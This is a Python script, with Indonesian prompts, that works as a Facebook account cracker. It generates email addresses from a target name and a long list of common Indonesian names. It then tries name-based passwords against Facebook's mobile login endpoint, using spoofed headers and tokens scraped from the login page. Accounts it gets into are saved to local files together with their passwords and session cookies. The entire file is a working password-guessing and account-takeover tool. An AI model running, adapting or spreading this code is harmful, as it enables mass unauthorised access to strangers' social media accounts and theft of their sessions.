import os, re, bs4, sys, json, rich, time, random, datetime, requests; from time import sleep, strftime; from rich.console import Console; from rich.panel import Panel; from random import choice as rc; from random import randint as rr; from random import randrange as rg; from concurrent.futures import ThreadPoolExecutor; now = datetime.datetime.now(); dta = {'1':'Jan','2':'Feb','3':'Mar','4':'Apr','5':'Mei','6':'Jun','7':'Jul','8':'Agu','9':'Sepr','10':'Okt','11':'Nov','12':'Des'}; tgl = now.day; bln = dta[(str(now.month))]; thn = now.year; okc = ('OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); cpc = ('CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); ok,cp,loop,id,id2,idf,P,M,K,B,H,N,bsp,ses = 0,0,0,[],[],[],'\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[0m',bs4.BeautifulSoup,requests.Session()

def Main_Menu():
	NiawMXV(); nama = Console().input(' 𝙈𝙖𝙨𝙪𝙠𝙖𝙣 𝙉𝙖𝙢𝙖 𝙏𝙖𝙧𝙜𝙚𝙩 : '); dump = Console().input(" 𝙏𝙤𝙩𝙖𝙡 𝙘𝙡𝙤𝙣𝙚: "); CC   = 0
	for xv in range(int(dump)):
		AA = nama; BB = Inisial(); CC+=1; cc = str(rr(0,999)); DD = rc(['',f'@{rc(["exdonuts","yahoo","hotmail","gmail"])}.com']); EE = rc([f'{AA}{rc(["",".",""])}{BB}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{BB}{rc(["",".",""])}{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{AA}{rc(["",".",""])}{BB}{DD}',f'{BB}{rc(["",".",""])}{AA}{DD}']); FF = f'{EE}|{nama}'
		if FF in id: pass
		else: id.append(FF)
		print(f" > terkumpul {len(id)} email",end=("\r")); sleep(0.0007)
	Eksekusi()

def Eksekusi():
	for x in id: id2.append(x)
	NiawMXV(); Console(width=50).print(Panel(f"[underline][bold #FF00D4]* [bold #FFFFFF]𝑪𝒓𝒂𝒄𝒌 [bold #00FF00]{len(id)}[bold #FFFFFF] 𝒆𝒎𝒂𝒊𝒍[bold #FF00D4] *[/underline]",style="bold purple",width=50),justify="center"); print()
	with ThreadPoolExecutor(max_workers=30) as MethodCrack:
		for uids in id2:
			user = uids.split('|')[0]; nmfl = uids.split('|')[1].lower(); nama = nmfl.split(' ')[0]; pasw = ['kata sandi',nama,nama+'12',nama+'123',nama+'1234',nama+'12345',nama+'123456',nama+'321',nama+'99',nama+'00',nama+'01',nama+'02',nama+'03',nama+'04',nama+'05',nama+'06',nama+'07',nama+'08',nama+'09',nama+'10',nama+'11',nama+'21',nama+'22',nama+'23',nama+' '+nama]
			MethodCrack.submit(Async,user,pasw,nmfl)
	print('\n'); Console().print(f'[bold #FFFFFF] > crack [bold #00FF00]{len(id)}[bold #FFFFFF] email selesai | akun ok:[bold #00FF00]{ok} [bold #FFFFFF]akun cp:[bold #FFFF00]{cp}'); exit()

def Async(user, pasw, nmfl):
	ses = requests.Session()
	usr = user.split('@')[0]
	global loop,ok,cp
	print(f"{H}💥 {M}({H}{loop}{M}){N} [{H}{ok}{N}]-[{K}{cp}{N}]{N}>{H}@{K}{usr}          {N}", end = ("\r"))
	for pw in pasw:
		try:
			requ = ses.get('https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
			kueh = (f'{";".join([ "%s=%s"%(keys, value) for keys, value in ses.cookies.get_dict().items() ])}')
			data = {
				'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
				'li':re.search('name="li" value="(.*?)"',str(requ)).group(1),
				'try_number':'0',
				'unrecognized_tries':'0',
				'email':f'{user}',
				'prefill_contact_point':f'{user}',
				'prefill_source':'browser_dropdown',
				'prefill_type':'password',
				'first_prefill_source':'browser_dropdown',
				'first_prefill_type':'contact_point',
				'had_cp_prefilled':'true',
				'had_password_prefilled':'true',
				'is_smart_lock':'false',
				'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requ)).group(1),
				'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
				'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requ)).group(1),
				'jazoest':re.search('name="jazoest" value="(.*?)"',str(requ)).group(1),
				'lsd':re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
				'__dyn':'',
				'__csr':'',
				'__req':rc(['1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14']),
				'__fmt':'1',
				'__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
				'__user':'0'
			}
			head = {
				'Host': 'd.facebook.com',
				'content-length': f'{len(str(data))}',
				'sec-ch-ua': 'Not-A.Brand";v="99", "Chromium";v="124'
				'sec-ch-ua-mobile: ?1',
				'user-agent': 'Instagram 146.0.0.27.125 Android (28/9; 420dpi; 1080x2131; samsung; SM-A505FN; a50; exynos9610; fi_FI; 221134032',
				'x-response-format': 'JSONStream',
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
				'sec-ch-ua-platform-version': '"12.0.0"',
				'x-requested-with': 'XMLHttpRequest',
				'x-asbd-id': '129477',
				'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
				'sec-ch-ua-model': '"SM-A505FN"',
				'sec-ch-prefers-color-scheme': 'light',
				'sec-ch-ua-platform': '"Android"',
				'accept': '*/*',
				'origin': 'https://x.prod.facebook.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://x.prod.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv18.0%2Fdialog%2Foauth%3Fapp_id%3D1862952583919182%26cbt%3D1727986819209%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df08a3a6269562fe02%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ffa03ed1d0dd821bbb%2526relation%253Dopener%26client_id%3D1862952583919182%26display%3Dtouch%26domain%3Dwww.tiktok.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%253Fenter_method%253Denter_personal_homepage%2526enter_from%253Dpersonal_homepage%2526launch_type%253D0%2526lang%253Did-ID%2526redirect_url%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Fprofile%26locale%3Den_US%26logger_id%3Df6784ceee22895ed4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfea58ec5ac2712acc%2526domain%253Dwww.tiktok.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.tiktok.com%25252Ffa03ed1d0dd821bbb%2526relation%253Dopener%2526frame%253Dfd28cd7ad2f7050df%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv18.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Dfea58ec5ac2712acc%26domain%3Dwww.tiktok.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.tiktok.com%252Ffa03ed1d0dd821bbb%26relation%3Dopener%26frame%3Dfd28cd7ad2f7050df%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'priority': 'u=1, i'
			}
			resp = ses.post(
				'https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
				cookies = {'cookie': kueh}, data = data, headers = head, allow_redirects = False
			)
			if "c_user" in ses.cookies.get_dict():
				kue = ';'.join([x+'='+v for x,v in ses.cookies.get_dict().items()])
				uid = re.findall('c_user=(.*);xs',kue)[0]
				if uid in idf or user in idf:
					break
				idf.append(uid)
				ok+=1
				print(f"└─➢ ID{H} {uid} : Password : {pw}      {N}└─➢{H} {kue}{N}")
				open('Okeh/'+okc,'a').write(f'{uid}|{pw}|{kue}\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				try: uid = ses.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				except: uid = user
				if uid in idf:
					break
				idf.append(uid)
				cp+=1
				print(f" └── {K}{uid}|{pw}               {N}")
				open('Cepe/'+cpc,'a').write(f'{uid}|{pw}\n')
				break
			else: continue
		except (requests.exceptions.ConnectionError): sleep(15)
	loop +=1

def NiawMXV(): os.system('clear'); Console().print("""[bold #FF00D4]
[bold #00FF00]███████████████████████████████████████████████
[bold #00FFCC]██▄─▄▄▀███▀▄─███▄─▀█▄─▄██▄─▄▄▀██─▄▄─██▄─▀█▀─▄██
[bold #FF8888]███─▄─▄███─▀─████─█▄▀─████─██─██─██─███─█▄█─███
[bold #FF00D4]█▀▄▄▀▄▄▀▀▄▄▀▄▄▀▀▄▄▄▀▀▄▄▀▀▄▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▀▄▄▄▀█
[bold #00FF00]███████████████████████████████████████████████
""")
def Inisial(): return rc(['handayani','ardiana','ardiansyah','ardiansah','ardianto','ardianti','aprianto','aprianti','apriadi','alhidayat','aldebaran','alfahri','alghazali','dirgantara','dermansah','derwansah','dermanto','darmanto','darmansyah','daryanto','dermawan','darmawan','darmansyah','dermansah','derwansyah','erlangga','firmansah','firmansyah','fadilah','gunawan','ginanjar','gustawan','gustomi','hartono','haryanto','haryadi','hariadi','hanupis','herdiansah','herdiansyah','ferdiansyah','febriansyah','febriansah','ferdiansah','ferdianto','febrianto','febrian','irawan','jaelani','jaeludin','jaylani','kurnia','kurniawan','kusmayanto','kadarsah','lesmana','laksana','lasmana','maulana','mulyana','mulyono','maulidan','mulyadi','nugraha','nugroho','nurdiansyah','murdiansah','nurahman','nurohman','nurhidayat','nuraripin','aripin','nurohman','peratama','pertama','prasetya','prasetyo','pratama','purnomo','ramadhan','ramadan','ramadani','ramadhani','ramdhani','ramdhan','ramdan','santoso','susanto','supomo','sudarso','sulaeman','sulaiman','solihin','sodikin','suharto','sutomo','sumarna','sumarno','suherman','suhaedi','suhardi','suhendi','sucipto','saepuloh','wijaya','wijayanto','wiguna','widodo','wirawan','wiraditya','william','irwansyah','irwana','irwansyah','irianto','iriadi','saepudin','saripudin','saefudin','saefuloh','sarifudin','wicaksono','azizah','azzizah','azahra','azzahra','aisyah','adila','aprianti','aprilia','apriliani','asnawati','alisa','asyifa','assyifa','citrawati','derwati','darwati','damayanti','damayanto','budianti','budianto','belina','belinda','elmira','ananda','amanda','ananta','citata','fitriani','fitriana','ferawati','ferwati','fatmawati','hodizah','holifah','afifah','apipah','aropah','jatnika','janurin','kurniasih','melinda','melati','melani','marwati','maryanti','maryani','maryuni','maryati','nursafitri','nuraisyah','nurazahra','nurazzahra','nurazizah','nurazzizah','nurcahaya','nursabila','nurfitria','nursolihin','nursyakila','nursuci','nurfadilah','nurasih','fatimah','nurfatimah','nuradila','nurnadifah','nadifah','pratiwi','pertiwi','prasti','purwasih','purnama','agustina','evansyah','rusmini','rusmiati','rusmana','rosalina','rosmawati','rostiwi','rosyani','anggraena','anggraini','anggraeni','nurjanah','salsabila','sabila','safitri','suarsih','sukaesih','sutini','sumarni','suherni','suharni','solifah','syakila','sandini','sunengsih','suningsih','ningsih','nengsih','widiawati','widyawati','yuningsih','yunengsih','yulianti','julianti','yulianto','julianto','safira','syafira','wahyudi','wahyudin','andrian','ardiani','andhiani','asmawati','asmara','asifa','ekaputri','nurhasanah','hasanah','marlina','adit','aditya','ahmad','arip','ardi','anto','agus','azis','ajis','apep','arya','aryo','asep','beni','beben','bang','boni','badru','badrus','cahyo','diki','dika','andika','deden','dadan','dudung','dadang','didin','dimas','doni','dafa','dedi','dudi','elan','elang','angga','anggi','edi','fasha','firman','fatir','fatah','fazri','fikri','engkus','endang','galih','galuh','galang','gilang','aldi','alpin','gagan','haris','hari','heri','herul','iwan','idan','idun','idin','fajar','jejen','jejee','jordi','joni','jajang','oji ','fauzi','putra','feri','padil','ari','hendi','eded','rendi','randi','roni','riski','rizki','risky','rizky','riki','rifki','ilham','hasan','rifan','teten','ade','ucup','udin','wili','andi','yayan','yana','yono','yanto','bili','azim','arlin','alin','anita','anisa','andin','andini','araa','citra','cinta','cicin','cici','cicih','desi','desti','dewi','dwi','destika','deswita','delin','delina','diniyah','dini','dina','dani','eci','esih','ela','elin','enci','erni','erna','empit','fitri','fifit','fina','ilah','ina','indah','inem','ida','iis','jani','kesya','kania','kaka','kiki','lala','loli','lesti','manda','amanda','mawar','entin','nana','nasya','nesya','nazwa','nanda','nandita','nadia','nadin','nandita','nuri','aida','aini','ninis','ndah','putri','puput','mutia','nur','resti','risya','rina','rini','ririn','rida','dila','adel','amel','mela','adelia','sifa','syifa','sinta','sintia','sindi','sinar','soleh','sodik','sindi','sindy','septi','sonia','senia','senny','seli','serli','serly','fatma','tia','tika','titin','cucu','cecep','widia','widi','widya','delia','wina','wiwi','wiwit','wika','riska','hesti','aulia','andri','aulia','yani','yuni','yeni','yeyen','lasma','zahra','zahwa','cahya','kekey','keke','lia','dahlia','denis','siti','wulan','herlina','lina','lani','leni','deti','dela'])

if __name__=='__main__':
	try: os.mkdir('Okeh')
	except: pass
	try: os.mkdir('Cepe')
	except: pass; Main_Menu()